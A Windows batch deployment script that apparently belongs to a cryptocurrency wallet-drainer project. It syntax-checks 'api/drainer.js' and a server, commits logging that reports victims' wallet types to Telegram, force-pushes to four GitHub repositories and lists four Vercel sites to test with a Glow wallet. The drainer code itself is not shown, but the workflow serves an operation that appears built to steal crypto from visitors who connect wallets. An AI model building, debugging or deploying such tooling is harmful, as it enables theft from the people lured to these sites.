@echo off
echo ========================================
echo DEBUG WALLET TYPE LOGGING
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo DEBUGGING CHANGES ADDED
echo ========================================
echo.
echo 1. FRONTEND DEBUGGING
echo - Added console.log for wallet type before logging
echo - Shows what wallet type is being sent to backend
echo.
echo 2. SERVER-SIDE DEBUGGING
echo - Added console.log for received wallet log request
echo - Shows what data is being received from frontend
echo.
echo 3. TELEGRAM DEBUGGING
echo - Added console.log for wallet type processing
echo - Shows what wallet type is being processed
echo - Shows known wallet types array
echo - Shows final wallet type display
echo.
echo ========================================
echo VALIDATION
echo ========================================
echo.
echo Checking syntax...
node -c api/drainer.js
if %errorlevel% neq 0 (
    echo ERROR: api/drainer.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ api/drainer.js syntax OK
echo.
node -c server.js
if %errorlevel% neq 0 (
    echo ERROR: server.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ server.js syntax OK
echo.
echo ✓ HTML files don't need Node.js syntax checking
echo.
echo ========================================
echo COMMITTING DEBUGGING
echo ========================================
echo.
git add .
git commit -m "DEBUG: Wallet type logging - added debugging to frontend, server, and telegram logging to trace wallet type reporting"
echo.
echo ========================================
echo FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo DEBUGGING DEPLOYED
echo ========================================
echo.
echo ✓ Frontend debugging added
echo ✓ Server-side debugging added
echo ✓ Telegram debugging added
echo ✓ All repositories updated
echo.
echo NEXT STEPS:
echo 1. Test with Glow wallet
echo 2. Check console logs for wallet type
echo 3. Check server logs for received data
echo 4. Check Telegram logs for wallet type display
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo DEBUGGING CHANGES HAVE BEEN DEPLOYED!
pause
